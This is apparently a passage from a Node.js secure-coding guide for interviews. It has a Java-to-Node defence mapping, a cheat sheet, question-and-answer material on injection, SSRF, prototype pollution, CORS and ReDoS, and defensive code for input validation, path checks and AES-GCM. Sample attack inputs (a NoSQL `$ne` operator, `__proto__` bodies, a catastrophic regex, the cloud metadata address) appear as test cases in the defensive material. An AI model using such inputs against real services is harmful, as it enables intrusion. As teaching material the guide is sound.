| Bean Validation (`@Valid`, `@NotNull`, `@Size`) | zod, ajv or valibot schemas at the edge |
| Jackson `FAIL_ON_UNKNOWN_PROPERTIES`, DTOs | strict schemas that reject unknown keys, explicit field picking |
| JPA and `PreparedStatement` parameters | `pg` `$1` parameters, query builders, ORMs |
| `@PreAuthorize`, method security, ownership checks | middleware plus checks in the service |
| `CsrfFilter`, `SecurityFilterChain` headers | `helmet`, CSRF tokens, SameSite cookies |
| `@CrossOrigin`, `CorsConfigurationSource` | `cors` with an exact allow-list |
| Java deserialisation gadgets, Log4Shell | unsafe `merge`, prototype pollution, `eval`, template injection |
| SSRF defences with an `InetAddress` check | `dns.lookup` and a private address check, egress rules |
| Bucket4j, Resilience4j `RateLimiter` | `express-rate-limit` with Redis, gateway limits |
| OWASP Dependency-Check, Maven enforcer | `pnpm audit`, Renovate, lockfile |
| `SecureRandom`, `MessageDigest.isEqual` | `crypto.randomBytes`, `timingSafeEqual` |
| JCA `Cipher` with `AES/GCM/NoPadding` | `createCipheriv('aes-256-gcm')` |
| SecurityManager (removed), container isolation | permission model, containers, non-root |
| Spring Security as the default framework | assembling libraries (`helmet`, schema validator, auth library), so the discipline is yours |

## Cheat sheet {#cheatsheet}

| Topic | Remember |
| --- | --- |
| mindset | trust boundaries, least privilege, defence in depth, the server decides |
| validation | schema at the edge, allow-list, strict, reject unknown keys, build a new object, check types |
| SQL | parameters always, allow-list identifiers, least-privilege DB user |
| NoSQL | validate types, reject `$` operator objects |
| commands | `execFile` with an array, no shell, prefer a library, never `eval` |
| objects | pick fields (mass assignment), skip `__proto__` (pollution), `Map`, `hasOwn` |
| SSRF | allow-list hosts, resolve and reject private ranges, no redirects, timeouts, egress rules |
| files | resolve and compare paths, generated names, magic bytes, private storage |
| browser | encode output, sanitise, CSP, helmet, exact CORS, SameSite and CSRF tokens |
| abuse | body and time limits, rate limit with a shared store, page caps, ReDoS-safe regex |
| crypto | `randomBytes`, `timingSafeEqual`, AES-256-GCM with a fresh IV, keys in a KMS, never skip TLS checks |
| data | classify, encrypt, mask, redact logs, generic errors with correlation ids, per-object authorisation |
| supply chain | lockfile, frozen install, audit, script allow-list, reviewed updates, pin CI actions |
| runtime | non-root, read-only, no debug ports, network policies, permission model, patched Node |
| testing | SAST, audit, secret and image scanning, DAST, abuse-case tests, threat model |
| response | audit log, alerts, incident plan: contain, rotate, investigate, notify, learn |

## Interview questions {#questions}

### [basic] What is injection and what is the general defence? {#injection-q}

Injection is untrusted data being interpreted as code or a command by another system: SQL, NoSQL operators, shell commands, templates, LDAP, log lines. The general defence is to keep data and code apart: parameterised queries, argument arrays instead of shell strings, output encoding, and allow-listing anything that cannot be a parameter. Add schema validation of input and least-privilege accounts so a missed case does less damage.

### [basic] How do you prevent SQL injection in Node.js? {#sql-q}

Use parameterised queries (`pool.query('... WHERE owner = $1', [owner])`) in the driver and in every ORM or builder raw-query path, so the value is sent separately from the SQL text. Allow-list identifiers such as sort columns, escape `LIKE` wildcards, validate types at the edge, and connect as a least-privilege database user. String concatenation or template literals with user values are the bug.

### [basic] What is the difference between input validation and output encoding? {#validate-encode-q}

Validation checks that incoming data is well formed and acceptable (type, length, range, format) at the trust boundary. Output encoding makes data safe for the context in which it is placed (HTML, attribute, URL, SQL parameter) so it is displayed as data and not executed. Both are needed: validation reduces what gets in, and encoding stops what remains from being interpreted as code.

### [basic] What is mass assignment and how do you avoid it? {#mass-q}

Copying a whole request body into a model or an update lets a caller set fields they must not control, such as `role`, `balance` or `owner`. Reject unknown keys with a strict schema and build the object from explicitly allowed fields, with server-controlled fields never accepted from the client. TypeScript types do not help because they disappear at runtime.

### [basic] Why is Math.random unsuitable for tokens, and what do you use? {#random-q}

`Math.random` is a predictable pseudo-random generator, so an attacker who sees some output can predict later values. Use a cryptographically secure source: `crypto.randomBytes`, `crypto.randomUUID` or `crypto.randomInt`. Compare secrets with `timingSafeEqual`, not `===`.

### [intermediate] What is prototype pollution and how do you prevent it? {#proto-q}

A recursive merge, clone or path-set function that follows keys such as `__proto__` or `constructor.prototype` writes onto `Object.prototype`, so every object in the process gains attacker-chosen properties (for example `isAdmin`), which can bypass checks or crash the service. `JSON.parse` itself is safe, the danger is the code that processes the parsed data. Skip those keys, use `Object.hasOwn`, store dictionaries in a `Map` or `Object.create(null)`, validate with a schema that rejects unknown keys, keep libraries updated, and consider `--disable-proto=delete`.

### [intermediate] What is SSRF and how do you defend against it? {#ssrf-q}

The server is made to send a request to an address chosen by the attacker, typically an internal service or the cloud metadata endpoint that exposes credentials. Defend by avoiding user-supplied URLs, allow-listing hosts, allowing only https, resolving the name and rejecting loopback, private, link-local and mapped addresses, not following redirects automatically, setting timeouts and size limits, and adding egress network rules and IMDSv2. Beware DNS rebinding, where the address changes between the check and the connection, so connect to the checked address or rely on egress rules.

### [intermediate] How do you prevent path traversal when serving files? {#traversal-q}

Resolve the final path with `path.resolve(base, userPath)`, then verify with `path.relative` that it is still inside the base directory (not starting with `..` and not absolute), reject null bytes, and also check `realpath` if symlinks are possible. Better, avoid user-controlled paths: store files under generated ids and look names up in the database, and use `express.static` for static content. Check archive entry names to prevent zip slip.

### [intermediate] How do helmet, CSP, CORS and CSRF protections differ? {#headers-q}

helmet sets a set of security headers (HSTS, `nosniff`, frame protection, referrer policy, CSP). A Content Security Policy limits which scripts and resources a page may load, reducing the damage of XSS. CORS controls which other origins may read responses, and is not authentication. CSRF protection stops a hostile site from making the browser send an authenticated request, using SameSite cookies, anti-CSRF tokens or custom headers, and Origin checks. They address different attacks and are used together.

### [intermediate] How do you configure CORS safely? {#cors-q}

Use an allow-list of exact origins, not `*` with credentials and not a reflected `Origin` header. Compare origins exactly (an `endsWith` check also accepts `evilbank.example`), treat the `null` origin as untrusted, allow only the needed methods and headers, and remember that CORS only restricts reading responses in browsers. It does not replace authentication or CSRF protection, and it does not protect against non-browser clients.

### [intermediate] How do you protect a Node.js API against denial of service? {#dos-q}

Set body and upload size limits, server timeouts (`headersTimeout`, `requestTimeout`, keep-alive limits) and timeouts on every outbound call, apply rate limits per user, key and address with a shared store such as Redis (stricter on login and OTP endpoints), cap page sizes and query cost, avoid blocking the event loop (no synchronous work, ReDoS-safe regular expressions), limit concurrency and shed load when overloaded, and use the proxy or WAF for volumetric attacks. Respond with 413, 429 and 503 with `Retry-After`.

### [intermediate] Explain ReDoS and how to avoid it. {#redos-q}

A regular expression with nested or overlapping quantifiers, such as `^(a+)+$`, can take exponential time on a crafted input that almost matches, and while it runs the single JavaScript thread serves nobody. In a test it took about 3 seconds for 28 characters. Avoid nested quantifiers, limit input length before matching, use a parser for structured text, and use a linear-time engine like `re2` when users can supply patterns.

### [intermediate] How do you encrypt sensitive data correctly in Node.js? {#encrypt-q}

Use an authenticated mode, AES-256-GCM through `crypto.createCipheriv`, with a fresh random 12-byte IV per message, store the IV and the authentication tag with the ciphertext, and verify the tag on decryption (an error means tampering or the wrong key). Keys come from a KMS or secret manager, are rotated, and bulk data uses envelope encryption. Never use ECB, a reused IV, encryption without authentication or a home-made scheme, and use hashing with a slow function for passwords, not encryption.

### [intermediate] What do you never log, and how do you enforce it? {#logging-q}

Passwords, tokens, session ids, authorisation headers, full card numbers (PAN), card verification values, national ID numbers and secrets. Enforce it with structured logging and redaction (pino `redact` paths), masking helpers, keeping sensitive values out of URLs and query strings, scrubbing error reports, code review and tests that check log output, and secret scanning. Logs should still carry request ids, user ids and outcomes for the audit trail.

### [deep] How would you review an Express endpoint for security problems? {#review-q}

Follow the request. Authentication and then authorisation per object (can this user see this account?). Validation of every input source against a strict schema, including types and sizes. How data reaches the database (parameters, allow-listed identifiers, no operator objects) and other systems (`execFile`, URL fetching with SSRF checks, file paths). What is returned (only needed fields, no secrets, generic errors). Limits (body size, rate, timeouts, pagination). Headers, cookies, CORS and CSRF for browser use. Logging without secrets and an audit entry for important actions. Dependencies and their versions. Then test the abuse cases: another user's id, extra fields, wrong types, huge input, repeated calls.

### [deep] Design the security controls for a bank's Node.js payments API. {#design-q}

Edge: TLS, WAF and gateway rate limits, strict schema validation with unknown keys rejected, small body limits and timeouts. Identity: OIDC tokens verified with algorithm and audience checks, MFA and step-up for payee changes and large transfers, short-lived tokens. Authorisation: per-object ownership checks in the service, role and limit rules, idempotency keys, transfer limits and velocity checks. Data: parameterised SQL with a least-privilege database user, field-level AES-GCM for sensitive values with keys in a KMS, masking and log redaction, an append-only audit log. Platform: non-root read-only containers, network policies and egress restrictions, secrets from a manager, signed and scanned images, frozen lockfile and reviewed dependency updates, pinned CI actions with OIDC. Operations: SAST, DAST and dependency scanning as gates, abuse-case tests, alerts on 401, 403 and anomalies, and a rehearsed incident response with rotation of secrets.

### [coding] Implement `parseTransfer(input)`: strict validation of `from`, `to`, `amount` (integer cents) and `currency`, optional `reference`. Reject unknown fields, collect every issue, and return a new clean object. {#coding-validate}

```javascript
export class ValidationError extends Error {
  constructor(issues) {
    super('Validation failed');
    this.name = 'ValidationError';
    this.status = 422;
    this.issues = issues;
  }
}

export function parseTransfer(input) {
  const issues = [];
  if (input === null || typeof input !== 'object' || Array.isArray(input)) {
    throw new ValidationError([{ path: '', message: 'body must be an object' }]);
  }

  const allowed = new Set(['from', 'to', 'amount', 'currency', 'reference']);
  for (const key of Object.keys(input)) {
    if (!allowed.has(key)) issues.push({ path: key, message: 'unknown field' });
  }

  const id = (name) => {
    const v = input[name];
    if (typeof v !== 'string' || !/^[A-Z0-9]{8,12}$/.test(v)) issues.push({ path: name, message: 'must be an account id' });
    return v;
  };
  const from = id('from');
  const to = id('to');
  if (from !== undefined && from === to) issues.push({ path: 'to', message: 'must differ from from' });

  const { amount } = input;
  if (!Number.isInteger(amount) || amount <= 0 || amount > 10_000_000) {
    issues.push({ path: 'amount', message: 'must be a positive integer number of cents, at most 10000000' });
  }
  if (!['SGD', 'USD', 'EUR'].includes(input.currency)) issues.push({ path: 'currency', message: 'unsupported currency' });

  let reference = input.reference;
  if (reference !== undefined) {
    if (typeof reference !== 'string' || reference.length > 140) {
      issues.push({ path: 'reference', message: 'must be text up to 140 characters' });
    } else {
      reference = reference.normalize('NFC').replace(/[\u0000-\u001f\u007f]/g, ' ').trim();
    }
  }

  if (issues.length) throw new ValidationError(issues);
  return { from, to, amount, currency: input.currency, ...(reference ? { reference } : {}) };
}
```

The function checks the body is a plain object, rejects every key outside the allow-list (which blocks mass assignment such as `role: 'admin'`), validates each field's type, format and range (integer cents, an upper bound, an enumerated currency, a maximum reference length), and collects all issues so the client can fix them at once. It never reads `__proto__` or other unexpected keys into the result, because it **builds a new object** from the validated fields only. Control characters in the free text are replaced so they cannot forge log lines. In my tests a good request produced a clean object, and an extra `role`, a string amount, a negative amount, `from: { $ne: null }`, an array body and a `__proto__` body were all rejected. A middleware turns `ValidationError` into a 422 response.

### [coding] Implement `safeJoin(baseDir, userPath)` that prevents path traversal, and `assertPublicHttpUrl(url)` that refuses URLs resolving to private addresses (SSRF). {#coding-safe}

```javascript
import path from 'node:path';
import { lookup } from 'node:dns/promises';
import net from 'node:net';

export function safeJoin(baseDir, userPath) {
  if (typeof userPath !== 'string' || userPath.includes('\0')) throw new Error('invalid path');
  const base = path.resolve(baseDir);
  const target = path.resolve(base, userPath);
  const rel = path.relative(base, target);
  if (rel === '' || rel.startsWith('..') || path.isAbsolute(rel)) throw new Error('path escapes the base directory');
  return target;
}

export function isPrivateAddress(ip) {
  if (net.isIPv4(ip)) {
    const [a, b] = ip.split('.').map(Number);
    return a === 10 || a === 127 || a === 0
      || (a === 172 && b >= 16 && b <= 31)
      || (a === 192 && b === 168)
      || (a === 169 && b === 254)
      || (a === 100 && b >= 64 && b <= 127);
  }
  if (net.isIPv6(ip)) {
    const v = ip.toLowerCase();
    if (v.startsWith('::ffff:')) return isPrivateAddress(v.slice(7));
    return v === '::1' || v === '::' || v.startsWith('fc') || v.startsWith('fd')
      || v.startsWith('fe8') || v.startsWith('fe9') || v.startsWith('fea') || v.startsWith('feb');
  }
  return true;
}

export async function assertPublicHttpUrl(raw, { allowedHosts } = {}) {
  const url = new URL(raw);
  if (!['https:', 'http:'].includes(url.protocol)) throw new Error('only http and https');
  if (url.username || url.password) throw new Error('credentials in the URL are not allowed');
  if (allowedHosts && !allowedHosts.includes(url.hostname)) throw new Error('host not allowed');

  const addresses = await lookup(url.hostname, { all: true });
  if (addresses.length === 0 || addresses.some((a) => isPrivateAddress(a.address))) throw new Error('address not allowed');
  return url;
}
```

`path.resolve` collapses `..` segments and absolute paths first, so the safety check is on the real result: `path.relative` must not start with `..` and must not be absolute. The URL check parses the URL, restricts scheme, credentials and host, then resolves **all** addresses of the name and rejects the request if any is loopback, private, link-local (including the metadata address `169.254.169.254`), carrier-grade NAT or an IPv4-mapped IPv6 address. Unknown values are refused (fail closed). Use the result with `fetch(url, { redirect: 'error', signal: AbortSignal.timeout(3000) })`, and add egress network rules because DNS rebinding can change the address after the check. My tests covered traversal strings with `..`, backslashes, absolute paths, empty and null-byte paths, and private, mapped, metadata and `file:` URLs.

### [coding] Implement `encrypt` and `decrypt` with AES-256-GCM using Node's `crypto`: random IV per message, authentication tag, optional associated data, and tamper detection. {#coding-crypto}

```javascript
import { createCipheriv, createDecipheriv, randomBytes } from 'node:crypto';

export function encrypt(plaintext, key, aad = '') {
  if (key.length !== 32) throw new Error('key must be 32 bytes');
  const iv = randomBytes(12);
  const cipher = createCipheriv('aes-256-gcm', key, iv);
  if (aad) cipher.setAAD(Buffer.from(aad));
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, ciphertext]).toString('base64url');
}

export function decrypt(token, key, aad = '') {
  const raw = Buffer.from(token, 'base64url');
  if (raw.length < 28) throw new Error('invalid token');
  const decipher = createDecipheriv('aes-256-gcm', key, raw.subarray(0, 12));
  decipher.setAuthTag(raw.subarray(12, 28));
  if (aad) decipher.setAAD(Buffer.from(aad));
  return Buffer.concat([decipher.update(raw.subarray(28)), decipher.final()]).toString('utf8');
}

// usage: the key comes from a KMS, the account id is bound as associated data
const key = randomBytes(32);
const token = encrypt('4111111111111111', key, 'acct-1');
decrypt(token, key, 'acct-1');        // '4111111111111111'
decrypt(token, key, 'acct-2');        // throws: the ciphertext was moved to another record
```

GCM gives confidentiality and integrity together. A new random 12-byte IV is generated for every message (reusing an IV under one key breaks GCM), the 16-byte tag authenticates both the ciphertext and the optional associated data (the account id here, which is not secret but ties the ciphertext to its record), and `decipher.final()` throws if anything was altered, so a failure must be treated as tampering, never ignored. The token stores `iv | tag | ciphertext` in base64url. In my tests the round trip worked, two encryptions of the same text differed, and a wrong key, a wrong associated-data value and a single flipped bit all made decryption throw. In production the key is held by a KMS and rotated, and large data uses a data key encrypted by the KMS (envelope encryption).
